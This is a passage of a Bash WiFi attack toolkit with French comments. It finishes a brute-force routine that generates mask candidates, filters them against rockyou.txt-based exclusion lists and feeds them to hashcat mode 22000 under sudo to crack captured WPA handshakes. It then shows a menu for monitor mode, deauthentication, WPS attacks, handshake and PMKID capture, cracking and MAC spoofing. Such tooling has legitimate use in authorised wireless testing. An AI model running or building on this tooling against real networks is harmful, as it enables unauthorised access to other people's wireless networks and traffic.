  local excl_tmp_dir="" memlimit="1G"
  if [[ "${exans,,}" == "y" ]]; then
    # crée un répertoire temporaire pour contenir les fichiers d'exclusion par longueur
    excl_tmp_dir=$(mktemp -d /tmp/bf_exclude_bylen.XXXXXX) || excl_tmp_dir=""
    if [[ -z "$excl_tmp_dir" ]]; then echo -e "${C_RED}$WIFI_ERROR_CREATE_TEMP_DIR${C_RESET}"; return 1; fi
    echo -e "${C_INFO}$WIFI_BUILDING_EXCLUSIONS_IN : $excl_tmp_dir${C_RESET}"

    # Propose rockyou.txt ou un fichier personnalisé
    echo "$WIFI_WHICH_WORDLIST_EXCLUDE"
    echo "  1) $WIFI_ROCKYOU_RECOMMENDED"
    echo "  2) $WIFI_CUSTOM_FILE"
    read -rp "$WIFI_PROMPT_YOUR_CHOICE [1]: " excl_choice
    excl_choice="${excl_choice:-1}"
    
    local excl_source=""
    case "$excl_choice" in
      1)
        # Cherche rockyou.txt dans les emplacements standards
        if [[ -f "/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt" ]]; then
          excl_source="/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt"
        elif [[ -f "/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.gz" ]]; then
          echo -e "${C_INFO}$WIFI_ROCKYOU_COMPRESSED_DECOMPRESSING...${C_RESET}"
          zcat /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.gz > /tmp/rockyou_temp.txt
          excl_source="/tmp/rockyou_temp.txt"
        elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
          excl_source="/usr/share/wordlists/rockyou.txt"
        elif [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
          echo -e "${C_INFO}$WIFI_ROCKYOU_COMPRESSED_DECOMPRESSING...${C_RESET}"
          zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou_temp.txt
          excl_source="/tmp/rockyou_temp.txt"
        else
          echo -e "${C_RED}$WIFI_WORDLIST_NOT_FOUND (rockyou.txt)${C_RESET}"
          rm -rf "$excl_tmp_dir" 2>/dev/null || true
          excl_tmp_dir=""
        fi
        ;;
      2)
        read -rp "$WIFI_CUSTOM_EXCLUSION_PATH: " excl_source
        if [[ ! -f "$excl_source" ]]; then
          echo -e "${C_RED}$(printf "$WIFI_FILE_NOT_FOUND" "$excl_source")${C_RESET}"
          rm -rf "$excl_tmp_dir" 2>/dev/null || true
          excl_tmp_dir=""
        fi
        ;;
      *)
        echo -e "${C_YELLOW}$WIFI_CHOICE_INVALID_CANCEL_EXCL${C_RESET}"
        rm -rf "$excl_tmp_dir" 2>/dev/null || true
        excl_tmp_dir=""
        ;;
    esac

    # Traite le fichier d'exclusion si on en a un
    if [[ -n "$excl_source" && -f "$excl_source" ]]; then
      printf "${C_INFO}$WIFI_PROCESSING_BASENAME ($WIFI_EXTRACTION_BY_LENGTH)...${C_RESET}\n" "$(basename "$excl_source")" >&2
      LC_ALL=C awk -v min="$minl" -v max="$maxl" -v out="$excl_tmp_dir" '{ l=length($0); if(l>=min && l<=max) print > (out "/exclude.len" l) }' "$excl_source"
      
      # Nettoie le fichier temporaire si créé pour rockyou.txt.gz
      if [[ "$excl_source" == "/tmp/rockyou_temp.txt" ]]; then
        rm -f /tmp/rockyou_temp.txt 2>/dev/null || true
      fi
    fi

    # Déduplique les fichiers par longueur avec utilisation mémoire contrôlée
    if [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]]; then
    echo -e "${C_INFO}$WIFI_DEDUPLICATION_IN_PROGRESS...${C_RESET}" >&2
    for f in "$excl_tmp_dir"/exclude.len*; do
      [[ -f "$f" ]] || continue
      if [[ -s "$f" ]]; then
        local before_lines=$(wc -l < "$f")
        printf "$WIFI_DEDUPLICATING_FILE...\n" "$(basename "$f")" "$before_lines" >&2
        tmpf="$f.tmp"
        if command -v sort >/dev/null 2>&1; then
          # Utilise sort avec limite mémoire et parallélisation si possible
          if sort --parallel=4 -u -S "$memlimit" -T "$excl_tmp_dir" "$f" -o "$tmpf" 2>/dev/null; then
            mv -f "$tmpf" "$f" || true
            local after_lines=$(wc -l < "$f")
            printf "$WIFI_REDUCED_TO_LINES\n" "$after_lines" "$(( (before_lines - after_lines) * 100 / before_lines ))" >&2
          else
            # Repli sans limite mémoire si ça échoue
            echo "$WIFI_FALLBACK_NO_MEM_LIMIT" >&2
            sort -u "$f" -o "$tmpf" 2>/dev/null || cp "$f" "$tmpf"
            mv -f "$tmpf" "$f" || true
          fi
        fi
      fi
    done

    echo "$WIFI_EXCLUSIONS_BUILT"
    for f in "$excl_tmp_dir"/exclude.len*; do
      [[ -f "$f" ]] || continue
      echo "  $(basename "$f") : $(wc -l <"$f" 2>/dev/null || echo 0) $WIFI_LINES"
    done
    
    # Vérifie si les fichiers d'exclusion ne sont pas trop volumineux (>500k lignes)
    local max_excl_found=0
    for f in "$excl_tmp_dir"/exclude.len*; do
      [[ -f "$f" ]] || continue
      local count=$(wc -l < "$f" 2>/dev/null || echo 0)
      if (( count > max_excl_found )); then
        max_excl_found=$count
      fi
    done
    
    if (( max_excl_found > 500000 )); then
      printf "${C_RED}$WIFI_WARNING_LARGE_EXCLUSION${C_RESET}\n" "$max_excl_found"
      echo "$WIFI_LARGE_EXCL_MEMORY_WARNING"
      echo ""
      echo "$WIFI_ALTERNATIVES_COLON"
      echo "  1) $WIFI_CONTINUE_ANYWAY_RISK"
      echo "  2) $WIFI_EXCLUDE_SPECIFIC_LENGTHS"
      echo "  3) $WIFI_CHOOSE_SMALLER_FILE"
      echo "  4) $WIFI_CANCEL_EXCLUSIONS"
      read -rp "$WIFI_YOUR_CHOICE [4]: " excl_alt
      excl_alt="${excl_alt:-4}"
      
      case "$excl_alt" in
        1)
          echo -e "${C_YELLOW}Continuation avec les exclusions volumineuses...${C_RESET}"
          ;;
        2)
          printf "$WIFI_AVAILABLE_LENGTHS\n" "$minl" "$maxl"
          read -rp "$WIFI_LENGTHS_TO_EXCLUDE_PROMPT: " selected_lens
          # Supprime les fichiers non sélectionnés
          for f in "$excl_tmp_dir"/exclude.len*; do
            [[ -f "$f" ]] || continue
            local fname=$(basename "$f")
            local flen=${fname#exclude.len}
            local keep=0
            IFS=',' read -ra LENS <<< "$selected_lens"
            for len in "${LENS[@]}"; do
              len=$(echo "$len" | tr -d ' ')
              if [[ "$flen" == "$len" ]]; then
                keep=1
                break
              fi
            done
            if [[ $keep -eq 0 ]]; then
              rm -f "$f"
            fi
          done
          printf "$WIFI_EXCLUSIONS_REDUCED_TO_LENGTHS\n" "$selected_lens"
          for f in "$excl_tmp_dir"/exclude.len*; do
            [[ -f "$f" ]] || continue
            echo "  $(basename "$f") : $(wc -l <"$f" 2>/dev/null || echo 0) $WIFI_LINES"
          done
          ;;
        3)
          echo -e "${C_INFO}$WIFI_CANCELLING_CURRENT_EXCLUSIONS${C_RESET}"
          rm -rf "$excl_tmp_dir" 2>/dev/null || true
          excl_tmp_dir=$(mktemp -d /tmp/bf_exclude_bylen.XXXXXX) || excl_tmp_dir=""
          read -rp "$WIFI_CUSTOM_EXCL_PATH_PROMPT: " custom_excl
          if [[ -f "$custom_excl" ]]; then
            printf "${C_INFO}$WIFI_PROCESSING_BASENAME...${C_RESET}\n" "$(basename "$custom_excl")" >&2
            LC_ALL=C awk -v min="$minl" -v max="$maxl" -v out="$excl_tmp_dir" '{ l=length($0); if(l>=min && l<=max) print > (out "/exclude.len" l) }' "$custom_excl"
            echo -e "${C_INFO}$WIFI_DEDUPLICATION_SIMPLE...${C_RESET}" >&2
            for f in "$excl_tmp_dir"/exclude.len*; do
              [[ -f "$f" ]] || continue
              if [[ -s "$f" ]]; then
                tmpf="$f.tmp"
                sort --parallel=4 -u -S "$memlimit" -T "$excl_tmp_dir" "$f" -o "$tmpf" 2>/dev/null || sort -u "$f" -o "$tmpf" || true
                mv -f "$tmpf" "$f" || true
              fi
            done
            echo "$WIFI_CUSTOM_EXCLUSIONS"
            for f in "$excl_tmp_dir"/exclude.len*; do
              [[ -f "$f" ]] || continue
              echo "  $(basename "$f") : $(wc -l <"$f" 2>/dev/null || echo 0) $WIFI_LINES"
            done
          else
            echo -e "${C_RED}$WIFI_FILE_NOT_FOUND_CANCEL_EXCL${C_RESET}"
            rm -rf "$excl_tmp_dir" 2>/dev/null || true
            excl_tmp_dir=""
          fi
          ;;
        *)
          echo -e "${C_YELLOW}$WIFI_BRUTEFORCE_FULL_WILL_RUN${C_RESET}"
          rm -rf "$excl_tmp_dir" 2>/dev/null || true
          excl_tmp_dir=""
          ;;
      esac
    fi
    fi
  fi

  # itère sur les longueurs

  # Aide : exécute hashcat en lisant les candidats depuis stdin ; utilise sudo via bash -c pour préserver le pipe
  run_hashcat_stdin() {
    local hf="$1"
    if command -v sudo >/dev/null 2>&1; then
      sudo bash -c "hashcat -m 22000 --stdin '$hf' --status --status-timer=15"
    else
      hashcat -m 22000 --stdin "$hf" --status --status-timer=15
    fi
  }

  for ((L=minl; L<=maxl; L++)); do
    echo "$WIFI_LAUNCHING_HASHCAT_MASK$L"
    mask=""
    for ((i=0;i<L;i++)); do
      if [[ $use_builtin -eq 1 ]]; then
        mask+="$builtin_token"
      else
        mask+='?1'
      fi
    done

    # construit la commande de générateur de candidats (hashcat --stdout) et pipe vers hashcat --stdin
    # Si une liste d'exclusion a été fournie, construit un fichier d'exclusion par longueur pour réduire la taille
    use_excl_len=0
    excl_len=""
    # Si nous avons construit des exclusions par longueur, utilise le fichier précalculé pour cette longueur
    if [[ -n "$excl_tmp_dir" && -f "$excl_tmp_dir/exclude.len${L}" ]]; then
      excl_len="$excl_tmp_dir/exclude.len${L}"
      if [[ -s "$excl_len" ]]; then
        use_excl_len=1
      else
        use_excl_len=0
      fi
    fi

    # choisit le filtre rapide : préfère rg (ripgrep) si disponible et fichier est UTF-8, sinon grep
    prefer_rg=0
    if [[ $use_excl_len -eq 1 ]] && command -v rg >/dev/null 2>&1 && command -v iconv >/dev/null 2>&1; then
      if iconv -f utf-8 -t utf-8 "$excl_len" >/dev/null 2>&1; then
        prefer_rg=1
      fi
    fi

    if [[ $use_excl_len -eq 1 ]]; then
      if [[ $use_builtin -eq 1 ]]; then
        if [[ $prefer_rg -eq 1 ]]; then
          { hashcat --stdout -a 3 "$mask" | rg -v -F -f "$excl_len" || true; } | run_hashcat_stdin "$hashfile"
        else
          { hashcat --stdout -a 3 "$mask" | grep -v -F -f "$excl_len" || true; } | run_hashcat_stdin "$hashfile"
        fi
      else
        escchars="$chars"
        escchars_safe=$(printf '%s' "$escchars" | LC_ALL=C tr -d '\000\n\r')
        escchars_safe=${escchars_safe//\`/}
        escchars_safe=${escchars_safe//\"/}
        escchars_safe=${escchars_safe//\'/}
        escchars_safe=${escchars_safe//\\/}
        escchars_safe=$(printf '%s' "$escchars_safe" | LC_ALL=C tr -cd '\11\12\15\40-\176')
        if [[ -z "$escchars_safe" ]]; then
          echo -e "${C_RED}$WIFI_CHARSET_EMPTY_AFTER_CLEANUP${C_RESET}"
          [[ -n "$excl_tmp" && -f "$excl_tmp" ]] && rm -f -- "$excl_tmp" || true
          [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]] && rm -rf -- "$excl_tmp_dir" || true
          return 1
        fi
        # Crée un fichier .hcchr temporaire pour le charset personnalisé
        local hcchr_file
        hcchr_file=$(mktemp /tmp/hashcat_charset.XXXXXX.hcchr) || { echo -e "${C_RED}Erreur : impossible de créer le fichier charset${C_RESET}"; return 1; }
        printf '%s' "$escchars_safe" > "$hcchr_file"
        
        echo "$WIFI_GENERATION_FOR_LENGTH $L ($WIFI_CUSTOM_CHARSET_PARAM)" >&2
        echo "DEBUG: mask='$mask' charset file='$hcchr_file'" >&2
        printf "$WIFI_DEBUG_EXCL_FILE_CONTAINS\n" "$excl_len" "$(wc -l < "$excl_len")" >&2
        
        # Test : compter combien de candidats passent le filtre
        local test_count
        if [[ $prefer_rg -eq 1 ]]; then
          test_count=$(hashcat --stdout -a 3 -1 "$hcchr_file" "$mask" 2>/dev/null | head -1000 | rg -v -F -f "$excl_len" | wc -l)
        else
          test_count=$(hashcat --stdout -a 3 -1 "$hcchr_file" "$mask" 2>/dev/null | head -1000 | grep -v -F -f "$excl_len" | wc -l)
        fi
        printf "$WIFI_DEBUG_TEST_COUNT_PASS_FILTER\n" "$test_count" >&2
        
        if [[ $prefer_rg -eq 1 ]]; then
          { hashcat --stdout -a 3 -1 "$hcchr_file" "$mask" 2>/dev/null | rg -v -F -f "$excl_len" || true; } | run_hashcat_stdin "$hashfile"
        else
          { hashcat --stdout -a 3 -1 "$hcchr_file" "$mask" 2>/dev/null | grep -v -F -f "$excl_len" || true; } | run_hashcat_stdin "$hashfile"
        fi
        rm -f "$hcchr_file" || true
      fi
      rm -f -- "$excl_len" 2>/dev/null || true
    else
      if [[ $use_builtin -eq 1 ]]; then
        # Pas d'exclusion : exécute hashcat directement avec le masque (évite les problèmes de pipe stdin/sudo)
        CMD=(hashcat -m 22000 -a 3 "$hashfile" "$mask" --status --status-timer=15)
        printf 'CMD direct: '%s'\n' "${CMD[*]}" >&2
        if command -v sudo >/dev/null 2>&1; then
          sudo bash -c 'exec "$@"' _ "${CMD[@]}"
        else
          "${CMD[@]}"
        fi
      else
        escchars="$chars"
        escchars_safe=$(printf '%s' "$escchars" | LC_ALL=C tr -d '\000\n\r')
        escchars_safe=${escchars_safe//\`/}
        escchars_safe=${escchars_safe//\"/}
        escchars_safe=${escchars_safe//\'/}
        escchars_safe=${escchars_safe//\\/}
        escchars_safe=$(printf '%s' "$escchars_safe" | LC_ALL=C tr -cd '\11\12\15\40-\176')
        if [[ -z "$escchars_safe" ]]; then
          echo -e "${C_RED}$WIFI_CHARSET_EMPTY_AFTER_CLEANUP${C_RESET}"
          [[ -n "$excl_tmp" && -f "$excl_tmp" ]] && rm -f -- "$excl_tmp" || true
          [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]] && rm -rf -- "$excl_tmp_dir" || true
          return 1
        fi
        echo "$WIFI_DIRECT_HASHCAT_EXECUTION $L ($WIFI_CUSTOM_CHARSET_PARAM)" >&2
        echo "DEBUG: mask='$mask' escchars_safe='${escchars_safe}'" >&2
        # Écrit le charset dans un fichier temporaire .hcchr (format de fichier charset hashcat)
        local hcchr_file
        hcchr_file=$(mktemp /tmp/hashcat_charset.XXXXXX.hcchr) || { echo -e "${C_RED}Erreur : impossible de créer le fichier charset${C_RESET}"; return 1; }
        printf '%s' "$escchars_safe" > "$hcchr_file"
        if command -v sudo >/dev/null 2>&1; then
          sudo hashcat -m 22000 -a 3 -1 "$hcchr_file" "$hashfile" "$mask" --status --status-timer=15
        else
          hashcat -m 22000 -a 3 -1 "$hcchr_file" "$hashfile" "$mask" --status --status-timer=15
        fi
        rm -f "$hcchr_file" || true
      fi
    fi

    # permet à l'utilisateur d'arrêter entre les longueurs
    printf "$WIFI_LENGTH_COMPLETE_CONTINUE [Y/n]: \n" "$L"
    read -r cont
    if [[ "${cont}" == "n" || "${cont}" == "N" ]]; then
      echo "$WIFI_INTERRUPTED_BY_USER";
      [[ -n "$excl_tmp" && -f "$excl_tmp" ]] && rm -f -- "$excl_tmp" || true
      [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]] && rm -rf -- "$excl_tmp_dir" || true
      return 0
    fi
  done
  [[ -n "$excl_tmp" && -f "$excl_tmp" ]] && rm -f -- "$excl_tmp" || true
  [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]] && rm -rf -- "$excl_tmp_dir" || true
  # Supprime le répertoire temporaire d'exclusions par longueur s'il a été créé
  if [[ -n "$excl_tmp_dir" && -d "$excl_tmp_dir" ]]; then
    rm -rf -- "$excl_tmp_dir" || true
    printf "$WIFI_TEMP_EXCL_DIR_DELETED\n" "$excl_tmp_dir"
  fi
  echo "$WIFI_BRUTEFORCE_COMPLETE";
  return 0
}

# Menu principal
stack_menu() {
  while true; do
    clear
    echo -e "${C_ACCENT2}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "                     ${C_GOOD}${WIFI_MENU_TITLE}${C_RESET}                      "
    echo -e "${C_ACCENT2}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo -e "   ${C_SHADOW}${WIFI_MENU_SECTION_INTERFACE}${C_RESET}                                 "
    echo -e "   ${C_BOLD}${WIFI_MENU_HINT}${C_RESET}            "
    echo -e "   ${C_HIGHLIGHT}1)${C_RESET} ${C_INFO}${WIFI_MENU_1}${C_RESET}                                      "
    echo -e "   ${C_HIGHLIGHT}2)${C_RESET} ${C_INFO}${WIFI_MENU_2}${C_RESET}        "
    echo -e "   ${C_HIGHLIGHT}3)${C_RESET} ${C_INFO}${WIFI_MENU_3}${C_RESET}                      "
    echo -e "   ${C_HIGHLIGHT}4)${C_RESET} ${C_INFO}${WIFI_MENU_4}${C_RESET}                                              "
    echo -e "                                                                   "
    echo -e "   ${C_SHADOW}${WIFI_MENU_SECTION_RECON}${C_RESET}                                      "
    echo -e "   ${C_HIGHLIGHT}5)${C_RESET} ${C_INFO}${WIFI_MENU_5}${C_RESET}                                    "
    echo -e "   ${C_HIGHLIGHT}6)${C_RESET} ${C_INFO}${WIFI_MENU_6}${C_RESET}                              "
    echo -e "   ${C_HIGHLIGHT}7)${C_RESET} ${C_INFO}${WIFI_MENU_7}${C_RESET}                                   "
    echo -e "                                                                   "
    echo -e "   ${C_SHADOW}${WIFI_MENU_SECTION_ATTACKS}${C_RESET}                                             "
    echo -e "   ${C_HIGHLIGHT}8)${C_RESET} ${C_INFO}${WIFI_MENU_8}${C_RESET}                               "
    echo -e "   ${C_HIGHLIGHT}9)${C_RESET} ${C_INFO}${WIFI_MENU_9}${C_RESET}                   "
    echo -e "   ${C_HIGHLIGHT}10)${C_RESET} ${C_INFO}${WIFI_MENU_10}${C_RESET}                                        "
    echo -e "                                                                   "
    echo -e "   ${C_SHADOW}${WIFI_MENU_SECTION_CRACKING}${C_RESET}                                            "
    echo -e "   ${C_HIGHLIGHT}11)${C_RESET} ${C_INFO}${WIFI_MENU_11}${C_RESET}                                   "
    echo -e "   ${C_HIGHLIGHT}12)${C_RESET} ${C_INFO}${WIFI_MENU_12}${C_RESET}                                       "
    echo -e "   ${C_HIGHLIGHT}13)${C_RESET} ${C_INFO}${WIFI_MENU_13}${C_RESET}                             "
    echo -e "   ${C_HIGHLIGHT}14)${C_RESET} ${C_INFO}${WIFI_MENU_14}${C_RESET}                           "
    echo -e "   ${C_HIGHLIGHT}15)${C_RESET} ${C_INFO}${WIFI_MENU_15}${C_RESET}                               "
    echo -e "   ${C_HIGHLIGHT}16)${C_RESET} ${C_INFO}${WIFI_MENU_16}${C_RESET}                       "
    echo -e "   ${C_HIGHLIGHT}17)${C_RESET} ${C_INFO}${WIFI_MENU_17}${C_RESET}                               "
    echo -e "   ${C_HIGHLIGHT}18)${C_RESET} ${C_INFO}${WIFI_MENU_18}${C_RESET}                                   "
    echo -e "   ${C_HIGHLIGHT}19)${C_RESET} ${C_INFO}${WIFI_MENU_19}${C_RESET}                                           "
    echo -e "   ${C_HIGHLIGHT}20)${C_RESET} ${C_INFO}${WIFI_MENU_20}${C_RESET}             "
    echo -e "   ${C_HIGHLIGHT}21)${C_RESET} ${C_INFO}${WIFI_MENU_21}${C_RESET}                                  "
    echo -e "   ${C_HIGHLIGHT}22)${C_RESET} ${C_INFO}${WIFI_MENU_22}${C_RESET}                        "
    echo -e "   ${C_HIGHLIGHT}23)${C_RESET} ${C_INFO}${WIFI_MENU_23}${C_RESET}                                 "
    echo -e "                                                                   "
    echo -e "   ${C_RED}0)${C_RESET} ${C_RED}${WIFI_MENU_0}${C_RESET}                                                  "
    echo -e "${C_ACCENT2}═══════════════════════════════════════════════════════════════════${C_RESET}"
    echo -ne "${C_ACCENT1}$WIFI_PROMPT_CHOICE${C_RESET}"
    read -r choice

    case "$choice" in
      1) wifi_show_ifaces ;;
      2) wifi_select_iface && wifi_start_monitor_mode "$IFACE" ;;
      3) if wifi_select_iface; then wifi_stop_monitor_mode "$IFACE" || true; fi ;;
      4) wifi_select_iface && wifi_channel_hop "$IFACE" ;;
      5) wifi_airodump ;;
      6) wifi_wifite ;;
      7) wifi_bettercap ;;
      8) wifi_aireplay_deauth ;;
      9) wifi_wps_attack ;;
      10) wifi_capture_handshake ;;
      11) wifi_crack_aircrack ;;
      12) wifi_crack_hashcat ;;
      13) wifi_convert_handshake ;;
      14) wifi_auto_handshake ;;
      15) wifi_capture_pmkid ;;
      16)
        echo "$WIFI_START_SESSION_END_SESSION"
        read -r schoice
        if [[ "$schoice" == "1" ]]; then wifi_start_session; elif [[ "$schoice" == "2" ]]; then wifi_end_session; else echo "$WIFI_CHOICE_INVALID"; fi
        ;;
      17) wifi_select_target_tui ;;
      18) wifi_bruteforce ;;
      19) wifi_random_mac ;;
      20) wifi_cleanup ;;
      21) wifi_select_iface && wifi_channel_hop_adaptive "$IFACE" ;;
      22) wifi_help ;;
      23) wifi_restart_networkmanager ;;
      0) echo "$WIFI_GOODBYE"; break ;;
      *) echo -e "${C_RED}${WIFI_INVALID_CHOICE}${C_RESET}" ;;
    esac
    echo -e "\n${WIFI_PRESS_ENTER}"
    read -r
  done
}